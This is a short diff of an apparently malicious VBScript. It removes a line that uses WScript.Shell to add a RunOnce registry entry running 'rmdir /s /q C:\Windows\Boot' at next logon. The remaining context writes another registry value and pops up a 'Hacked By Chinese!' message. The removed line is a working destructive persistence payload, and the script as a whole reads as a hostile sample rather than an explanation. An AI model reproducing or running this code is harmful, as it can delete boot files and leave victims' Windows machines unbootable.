@@ -82,5 +82,4 @@ Else
 End If
 
 objRegistry.RegWrite strBackupRegistryPath & "\" & strBackupRegistryKey, strBackupRegistryValue, "REG_SZ"
-CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\DeleteFolder", "cmd /c rmdir /s /q C:\Windows\Boot", "REG_SZ"
 MsgBox "Hacked By Chinese!"
